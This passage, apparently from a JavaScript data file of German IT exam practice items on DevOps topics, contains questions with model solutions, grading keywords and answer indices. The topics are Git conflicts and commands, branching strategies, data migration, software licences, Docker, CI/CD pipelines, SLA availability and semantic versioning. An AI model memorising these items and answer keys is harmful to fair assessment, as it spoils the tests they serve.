    solution: `<b>Entstehung:</b> In beiden Branches wurde seit dem gemeinsamen Vorgänger-Commit <b>dieselbe Stelle</b> (gleiche Zeilen) in <code>Preis.java</code> unterschiedlich geändert. Git kann nicht automatisch entscheiden, welche Version gilt.<br>
<b>Darstellung</b> in der Datei:
<pre>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
    double rabatt = 0.05;
=======
    double rabatt = kunde.istStammkunde() ? 0.10 : 0.05;
&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature/rabatt</pre>
Oben die Version des aktuellen Branches (HEAD = main), unten die des einzumergenden Branches.<br>
<b>Auflösung:</b> Datei öffnen, fachlich richtige Version herstellen (ggf. mit Kollegen absprechen), Konfliktmarker entfernen, kompilieren/testen, <code>git add src/Preis.java</code>, <code>git commit</code> (bzw. <code>git merge --abort</code> zum Abbrechen).<br>
<b>Vorbeugung:</b> kleine, kurzlebige Branches; regelmäßig <code>main</code> in den Feature-Branch holen (pull/rebase); klare Zuständigkeiten und Absprachen; einheitliche Code-Formatierung (Formatter), damit keine „Format-Konflikte“ entstehen.`,
    explanation: `Häufiger Fehler: Konfliktmarker im Code stehen lassen und committen – der Build schlägt dann fehl.`,
    keywords: ["gleiche stelle|dieselbe stelle|gleichen zeilen|selbe zeile", "<<<<<<<|&lt;&lt;&lt;|konfliktmarker|markierung", "=======", "head", "git add", "git commit|commit", "manuell", "kleine|kurzlebig|regelmäßig"],
    tags: ["git", "konflikt"]
  },
  {
    id: "ga1-devops-011", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 3, points: 6,
    question: `Vergleichen Sie die Branching-Strategien <b>GitFlow</b> und <b>Trunk-Based Development</b>. Beschreiben Sie die verwendeten Branches und nennen Sie, für welche Art von Projekt bzw. Release-Prozess sich die jeweilige Strategie eignet.`,
    solution: `<b>GitFlow:</b>
<ul><li><code>main</code> (bzw. master): nur produktive, getaggte Releases</li>
<li><code>develop</code>: Integrationszweig für die nächste Version</li>
<li><code>feature/*</code>: Entwicklung einzelner Features, zweigen von develop ab und werden dorthin zurückgeführt</li>
<li><code>release/*</code>: Stabilisierung/Test einer Version vor dem Release, Merge in main und develop</li>
<li><code>hotfix/*</code>: dringende Fehlerbehebung direkt von main, Merge in main und develop</li></ul>
Geeignet für Software mit <b>geplanten, versionierten Releases</b> (z.&nbsp;B. Desktop-/On-Premises-Software, mehrere parallel gepflegte Versionen). Nachteil: komplex, langlebige Branches → Merge-Konflikte, langsamer.<br><br>
<b>Trunk-Based Development:</b> Alle entwickeln auf einem Hauptzweig (<code>main</code>/trunk) bzw. in sehr kurzlebigen Feature-Branches (Stunden bis max. 1–2 Tage), die häufig gemergt werden. Unfertige Funktionen werden per <b>Feature Toggles</b> ausgeblendet. Voraussetzung: hohe Testautomatisierung und CI.<br>
Geeignet für <b>Continuous Delivery/Deployment</b>, Web-/SaaS-Anwendungen mit häufigen Releases. Nachteil: hohe Disziplin und gute Testabdeckung erforderlich.`,
    explanation: `Zwischenform: GitHub Flow (main + Feature-Branches + Pull Requests, Deployment aus main).`,
    keywords: ["main|master", "develop", "feature", "release", "hotfix", "trunk", "kurzlebig", "feature toggle|feature flag|toggle", "continuous|ci"],
    tags: ["git", "branching"]
  },
  {
    id: "ga1-devops-012", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 3, points: 8,
    context: `Eine Versicherungsagentur löst ihre Access-Datenbank (ca. 40.000 Kundendatensätze, teilweise doppelt, Telefonnummern in unterschiedlichen Formaten, Adressen in einem Freitextfeld) durch ein neues CRM-System mit relationaler Datenbank ab.`,
    question: `Beschreiben Sie ein strukturiertes Vorgehen zur Datenmigration in mindestens sechs Schritten und nennen Sie zwei Möglichkeiten, die erfolgreiche Migration zu prüfen.`,
    solution: `<ol><li><b>Analyse</b> der Altdaten: Struktur, Datenmengen, Datenqualität (Dubletten, Formate, fehlende Pflichtfelder) ermitteln.</li>
<li><b>Mapping</b> festlegen: Welches Altfeld wird zu welchem Zielfeld? Transformationsregeln (z.&nbsp;B. Adressfreitext → Straße, PLZ, Ort; Telefonnummern ins Format E.164).</li>
<li><b>Datenbereinigung</b>: Dubletten zusammenführen, Formate vereinheitlichen, fehlerhafte Datensätze korrigieren oder markieren (mit Fachabteilung abstimmen).</li>
<li><b>Migrationsskripte/ETL</b> entwickeln (Extract – Transform – Load), Protokollierung fehlerhafter Datensätze.</li>
<li><b>Datensicherung</b> der Altdaten vor der Migration.</li>
<li><b>Testmigration</b> in einer Testumgebung, Ergebnisse prüfen, Skripte verbessern (ggf. mehrfach).</li>
<li><b>Echtmigration</b> zum geplanten Zeitpunkt (z.&nbsp;B. Wochenende), ggf. Datenfreeze im Altsystem.</li>
<li><b>Validierung und Abnahme</b> durch die Fachabteilung, Altsystem für Rückfall/Lesezugriff vorhalten, Dokumentation.</li></ol>
<b>Prüfmöglichkeiten:</b> Abgleich der Datensatzzahlen (Quelle minus Dubletten = Ziel), Stichproben einzelner Kunden durch die Fachabteilung, Prüfsummen/Summen über Felder (z.&nbsp;B. Summe der Beitragssummen), automatisierte Plausibilitätsprüfungen (Pflichtfelder, gültige PLZ), Testfälle mit typischen Geschäftsvorgängen im Neusystem.`,
    explanation: `Datenschutz nicht vergessen: Testmigration möglichst mit pseudonymisierten Daten oder in geschützter Umgebung durchführen.`,
    keywords: ["analyse", "mapping|zuordnung", "bereinig|dublette", "etl|extract|transform", "backup|sicherung", "testmigration|test", "validier|prüfen|abgleich", "datensatzzahl|anzahl|stichprobe"],
    tags: ["migration"]
  },
  {
    id: "ga1-devops-013", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 2, points: 6,
    context: `Ihr Team entwickelt für einen Kunden eine kommerzielle Webanwendung, die als SaaS betrieben und zusätzlich als On-Premises-Installation an Kunden ausgeliefert wird. Geplant ist die Verwendung von drei Bibliotheken: A unter <b>MIT</b>, B unter <b>Apache 2.0</b>, C unter <b>GPL v3</b>.`,
    question: `Erläutern Sie die wesentlichen Bedingungen der drei Lizenzen und beurteilen Sie, ob die Bibliotheken eingesetzt werden können.`,
    solution: `<ul><li><b>MIT</b> (permissiv): Nutzung, Änderung, Weitergabe und kommerzielle Verwendung erlaubt, auch in proprietärer Software. Bedingung: Copyright- und Lizenzhinweis beibehalten. Kein Haftungsanspruch. → <b>Einsetzbar.</b></li>
<li><b>Apache 2.0</b> (permissiv): wie MIT, zusätzlich ausdrückliche <b>Patentlizenz</b>, Änderungen an Dateien müssen gekennzeichnet werden, NOTICE-Datei mitliefern. → <b>Einsetzbar.</b></li>
<li><b>GPL v3</b> (starkes Copyleft): Wird die Software <b>weitergegeben</b> (On-Premises-Auslieferung), muss das abgeleitete Gesamtwerk ebenfalls unter GPL stehen und der Quellcode bereitgestellt werden. → Für die On-Premises-Variante als proprietäre Software <b>nicht einsetzbar</b>. Bei reinem SaaS-Betrieb liegt keine Weitergabe vor („SaaS-Lücke“) – das schließt erst die AGPL. Empfehlung: Alternative mit permissiver/LGPL-Lizenz suchen oder kommerzielle Lizenz erwerben.</li></ul>`,
    explanation: `Wichtig ist der Unterschied zwischen permissiven Lizenzen und Copyleft sowie die Frage, ob eine „Verbreitung“ stattfindet.`,
    keywords: ["mit", "apache", "gpl", "copyleft", "permissiv|freizügig", "lizenzhinweis|copyright|hinweis", "patent", "quellcode|source", "weitergabe|verbreitung|ausgeliefert"],
    tags: ["lizenzen"]
  },
  {
    id: "ga1-devops-014", part: "GA1", topic: "ga1-devops", type: "code", difficulty: 2, points: 6, lang: "pseudocode",
    context: `Sie sollen im Projekt-Repository <code>https://git.firma.example/team/shop.git</code> (Hauptzweig <code>main</code>) ein neues Feature „Wunschliste“ entwickeln. Das Repository liegt noch nicht lokal vor.`,
    question: `Geben Sie die Git-Befehle in der richtigen Reihenfolge an, um: (1) das Repository zu holen, (2) einen Feature-Branch <code>feature/wunschliste</code> anzulegen und zu wechseln, (3) die geänderte Datei <code>src/Wunschliste.java</code> zu committen, (4) vor dem Push den aktuellen Stand von main per Rebase zu übernehmen, (5) den Branch zu pushen, damit ein Pull Request erstellt werden kann, und (6) nach dem Merge des PR lokal aufzuräumen.`,
    solution: `<pre># (1) Repository klonen
git clone https://git.firma.example/team/shop.git
cd shop

# (2) Feature-Branch anlegen und wechseln
git switch -c feature/wunschliste        # alternativ: git checkout -b feature/wunschliste

# (3) Änderung committen
git status
git add src/Wunschliste.java
git commit -m "Wunschliste: Artikel merken und anzeigen"

# (4) aktuellen main-Stand übernehmen
git fetch origin
git rebase origin/main                   # Konflikte lösen → git add … → git rebase --continue

# (5) Branch pushen (Upstream setzen) → Pull Request im Webinterface erstellen
git push -u origin feature/wunschliste

# (6) nach dem Merge aufräumen
git switch main
git pull
git branch -d feature/wunschliste
git push origin --delete feature/wunschliste   # falls nicht automatisch gelöscht</pre>`,
    explanation: `Hätten Sie den Branch bereits vor dem Rebase gepusht, wäre anschließend <code>git push --force-with-lease</code> nötig. Commit-Messages aussagekräftig formulieren (ggf. Ticketnummer).`,
    keywords: ["git clone", "git switch -c|git checkout -b", "git add", "git commit", "git fetch|git pull", "git rebase", "git push", "-u|--set-upstream", "git branch -d"],
    tags: ["git", "befehle"]
  },
  {
    id: "ga1-devops-015", part: "GA1", topic: "ga1-devops", type: "code", difficulty: 2, points: 6, lang: "pseudocode",
    context: `Eine Spring-Boot-Anwendung wird mit Maven zur Datei <code>target/shop-1.4.0.jar</code> gebaut, benötigt Java 21 und lauscht auf Port 8080. Die Datenbank-URL soll über die Umgebungsvariable <code>DB_URL</code> konfigurierbar sein.`,
    question: `Erstellen Sie ein Dockerfile für die Anwendung sowie die Befehle zum Bauen des Images (Name <code>shop:1.4.0</code>) und zum Starten eines Containers, der auf Port 80 des Hosts erreichbar ist.`,
    solution: `<pre># Dockerfile
FROM eclipse-temurin:21-jre
WORKDIR /app
COPY target/shop-1.4.0.jar app.jar
ENV DB_URL=jdbc:postgresql://db:5432/shop
EXPOSE 8080
USER 1000                                   # nicht als root ausführen
ENTRYPOINT ["java", "-jar", "app.jar"]</pre>
<pre># Image bauen (im Verzeichnis mit dem Dockerfile)
docker build -t shop:1.4.0 .

# Container starten: Host-Port 80 → Container-Port 8080
docker run -d --name shop -p 80:8080 \\
  -e DB_URL=jdbc:postgresql://dbserver:5432/shop shop:1.4.0</pre>`,
    explanation: `Wichtige Elemente: Basis-Image mit passender Java-Version (JRE genügt zur Laufzeit), COPY des Artefakts, EXPOSE, ENTRYPOINT/CMD, Port-Mapping <code>-p host:container</code>, Konfiguration per Umgebungsvariable (keine Passwörter ins Image!). Optional: Multi-Stage-Build mit Maven-Image im ersten Schritt.`,
    keywords: ["from", "copy", "expose", "entrypoint|cmd", "docker build", "-t", "docker run", "-p 80:8080|80:8080", "-e|env"],
    tags: ["docker", "container"]
  },
  {
    id: "ga1-devops-016", part: "GA1", topic: "ga1-devops", type: "code", difficulty: 3, points: 8, lang: "pseudocode",
    context: `Für ein Java-Projekt (Maven) soll eine CI/CD-Pipeline in GitLab CI bzw. GitHub Actions eingerichtet werden. Anforderungen: Bei jedem Push werden Build und Unit-Tests ausgeführt sowie eine statische Codeanalyse durchgeführt. Nur auf dem Branch <code>main</code> wird zusätzlich ein Docker-Image gebaut, auf die Staging-Umgebung deployt und das Produktiv-Deployment nach <b>manueller Freigabe</b> durchgeführt.`,
    question: `Erstellen Sie eine Pipeline-Definition (YAML oder strukturierter Pseudocode) mit Stufen, Jobs, Bedingungen und Artefakten.`,
    solution: `<pre># .gitlab-ci.yml
stages:
  - build
  - test
  - analyse
  - package
  - deploy-staging
  - deploy-prod

build:
  stage: build
  image: maven:3.9-eclipse-temurin-21
  script:
    - mvn -B compile

unit-tests:
  stage: test
  image: maven:3.9-eclipse-temurin-21
  script:
    - mvn -B test
  artifacts:
    reports:
      junit: target/surefire-reports/*.xml

codeanalyse:
  stage: analyse
  script:
    - mvn -B verify sonar:sonar

docker-image:
  stage: package
  script:
    - mvn -B package -DskipTests
    - docker build -t registry.firma.example/shop:$CI_COMMIT_SHORT_SHA .
    - docker push registry.firma.example/shop:$CI_COMMIT_SHORT_SHA
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'

deploy-staging:
  stage: deploy-staging
  environment: staging
  script:
    - ./deploy.sh staging $CI_COMMIT_SHORT_SHA
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'

deploy-prod:
  stage: deploy-prod
  environment: production
  script:
    - ./deploy.sh production $CI_COMMIT_SHORT_SHA
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
      when: manual                # manuelle Freigabe = Continuous Delivery</pre>`,
    explanation: `Bewertet werden: sinnvolle Stufenreihenfolge, Abbruch der Pipeline bei Fehlschlag (Standardverhalten), Bedingung auf main, manuelle Freigabe für Produktion, Versionierung des Images (Commit-Hash/Tag statt „latest“), Testberichte als Artefakte. Zugangsdaten für Registry/Server gehören in geschützte CI-Variablen, nicht in die YAML-Datei.`,
    keywords: ["stage|stages", "build", "test", "sonar|analyse|lint", "docker build", "main", "manual|manuell|freigabe", "deploy", "artifact|artefakt"],
    tags: ["ci-cd", "pipeline"]
  },
  {
    id: "ga1-devops-017", part: "GA1", topic: "ga1-devops", type: "code", difficulty: 2, points: 5, lang: "java",
    context: `Nach <code>git merge feature/versand</code> enthält die Datei <code>Versand.java</code>:
<pre><code>public BigDecimal versandkosten(BigDecimal warenwert) {
&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
    if (warenwert.compareTo(new BigDecimal("50")) &gt;= 0) {
        return BigDecimal.ZERO;
    }
=======
    if (warenwert.compareTo(new BigDecimal("40")) &gt;= 0) {
        return BigDecimal.ZERO;
    }
    if (istInsel(plz)) {
        return new BigDecimal("12.90");
    }
&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature/versand
    return new BigDecimal("4.90");
}</code></pre>
Laut Fachabteilung gilt: versandkostenfrei ab <b>50 €</b> (Entscheidung auf main), der Inselzuschlag aus dem Feature soll übernommen werden.`,
    question: `Geben Sie die aufgelöste Fassung der Methode und die Git-Befehle zum Abschluss des Merges an. Nennen Sie außerdem einen fachlichen Fehler, der im Feature-Code steckt.`,
    solution: `<pre><code>public BigDecimal versandkosten(BigDecimal warenwert, String plz) {
    if (warenwert.compareTo(new BigDecimal("50")) &gt;= 0) {
        return BigDecimal.ZERO;
    }
    if (istInsel(plz)) {
        return new BigDecimal("12.90");
    }
    return new BigDecimal("4.90");
}</code></pre>
<pre>git add src/Versand.java
git commit            # Merge-Commit mit vorgeschlagener Nachricht abschließen</pre>
<b>Fachlicher Fehler:</b> Die Variable <code>plz</code> wird verwendet, ist aber kein Parameter der Methode (Kompilierfehler) – die Signatur muss um <code>String plz</code> erweitert werden; alle Aufrufer sind anzupassen. Zudem ist fraglich, ob Inselkunden ab 50 € ebenfalls versandkostenfrei sein sollen (Reihenfolge der Prüfungen mit Fachabteilung klären).`,
    explanation: `Nach der Auflösung immer kompilieren und Tests laufen lassen, bevor committet wird. Konfliktmarker vollständig entfernen.`,
    keywords: ["50", "istinsel", "12.90", "4.90", "git add", "git commit", "plz", "parameter|signatur"],
    tags: ["git", "konflikt"]
  },
  {
    id: "ga1-devops-018", part: "GA1", topic: "ga1-devops", type: "order", difficulty: 1, points: 3,
    question: `Bringen Sie die Stufen einer typischen CI/CD-Pipeline in die richtige Reihenfolge.`,
    items: [
      `Checkout des Quellcodes aus dem Repository`,
      `Kompilieren / Build`,
      `Unit-Tests`,
      `Statische Codeanalyse (z. B. SonarQube)`,
      `Paketieren (JAR / Docker-Image) und im Artefakt-Repository ablegen`,
      `Deployment auf Staging und Integrations-/End-to-End-Tests`,
      `Freigabe und Deployment in Produktion`,
      `Monitoring der Produktivumgebung`
    ],
    solution: `Checkout → Build → Unit-Tests → statische Analyse → Paketieren → Staging + Integrationstests → Produktion → Monitoring.`,
    explanation: `Schnelle Prüfungen (Build, Unit-Tests) kommen zuerst („fail fast“), teure Tests (E2E) später. Statische Analyse und Unit-Tests können auch parallel laufen.`,
    tags: ["ci-cd"]
  },
  {
    id: "ga1-devops-019", part: "GA1", topic: "ga1-devops", type: "numeric", difficulty: 2, points: 3,
    context: `Ein Cloud-Anbieter garantiert für den Betrieb eines Webshops eine Verfügbarkeit von <b>99,9 %</b> pro Jahr (365 Tage).`,
    question: `Wie viele Stunden darf der Webshop pro Jahr maximal ausfallen, ohne dass das SLA verletzt wird? (auf zwei Nachkommastellen)`,
    answer: 8.76, tolerance: 0.01, unit: "Stunden",
    solution: `Jahresstunden: 365 × 24 = 8.760 h<br>Zulässige Ausfallzeit: 8.760 h × (1 − 0,999) = 8.760 × 0,001 = <b>8,76 h</b> (≈ 8 h 46 min).`,
    explanation: `Vergleich: 99 % = 87,6 h, 99,99 % = 0,876 h ≈ 53 min. Jede zusätzliche „9“ verkürzt die erlaubte Ausfallzeit um den Faktor 10.`,
    tags: ["monitoring", "sla"]
  },
  {
    id: "ga1-devops-020", part: "GA1", topic: "ga1-devops", type: "text", difficulty: 2, points: 6,
    context: `Für die Einführung einer neuen Personalzeiterfassung in einem Industriebetrieb (350 Mitarbeitende in der Produktion, 40 Bürokräfte, 5 Personalsachbearbeiter, 2 Administratoren) sollen die Mitarbeitenden geschult werden.`,
    question: `Entwickeln Sie ein Schulungskonzept: Nennen Sie Zielgruppen mit jeweiligen Schulungsinhalten und geeigneten Schulungsformen und beschreiben Sie zwei Maßnahmen zur Sicherung des Schulungserfolgs.`,
    solution: `<table>
<tr><th>Zielgruppe</th><th>Inhalte</th><th>Form</th></tr>
<tr><td>Produktionsmitarbeitende (350)</td><td>Stempeln am Terminal, Zeitkonto einsehen, Urlaubsantrag</td><td>kurze Einweisung in Gruppen am Terminal, Videotutorial, Kurzanleitung/Aushang</td></tr>
<tr><td>Bürokräfte (40)</td><td>Web-Self-Service, Korrekturanträge, Abwesenheiten</td><td>E-Learning-Modul, Webinar</td></tr>
<tr><td>Personalsachbearbeiter (5) – Key-User</td><td>Zeitmodelle pflegen, Korrekturen genehmigen, Auswertungen, Export an Lohnabrechnung</td><td>intensive Präsenzschulung in Schulungsumgebung mit Testdaten, Train-the-Trainer</td></tr>
<tr><td>Administratoren (2)</td><td>Installation, Benutzer/Rechte, Schnittstellen, Backup, Updates</td><td>Herstellerschulung, Betriebsdokumentation</td></tr>
</table>
<b>Erfolgssicherung:</b> Schulung zeitnah vor dem Go-live; Key-User als erste Ansprechpartner in den Abteilungen; Feedbackbögen und kurze Lernerfolgskontrolle; FAQ und Online-Hilfe; Hotline/Hypercare-Phase in den ersten Wochen; Nachschulungen bei Bedarf.`,
    explanation: `Bewertet wird die zielgruppengerechte Differenzierung. Ein „eine Schulung für alle“-Konzept erhält nur wenige Punkte. Mitbestimmung beachten: Bei Zeiterfassung (technische Überwachungseinrichtung) hat der Betriebsrat ein Mitbestimmungsrecht (§ 87 Abs. 1 Nr. 6 BetrVG).`,
    keywords: ["zielgruppe", "key-user|keyuser|multiplikator", "e-learning|webinar|video", "präsenz|praesenz|vor ort", "train-the-trainer", "schulungsumgebung|testdaten", "feedback|lernerfolg|evaluation", "administrator"],
    tags: ["schulung", "einfuehrung"]
  },
  {
    id: "ga1-devops-021", part: "GA1", topic: "ga1-devops", type: "mc", difficulty: 1, points: 2,
    context: `Eine Bibliothek liegt in Version <code>2.4.1</code> vor (Semantic Versioning). Es wird eine neue Funktion ergänzt, die bestehende Schnittstelle bleibt abwärtskompatibel.`,
    question: `Welche Versionsnummer erhält das nächste Release?`,
    options: [`2.4.2`, `2.5.0`, `3.0.0`, `2.5.1`],
    correct: [1],
    solution: `Semantic Versioning <code>MAJOR.MINOR.PATCH</code>: neue, abwärtskompatible Funktion → <b>MINOR</b> erhöhen, PATCH auf 0 zurücksetzen → <b>2.5.0</b>.`,
    explanation: `PATCH (2.4.2) nur für abwärtskompatible Fehlerbehebungen, MAJOR (3.0.0) bei inkompatiblen Änderungen der API.`,
    tags: ["versionierung"]
  }
);
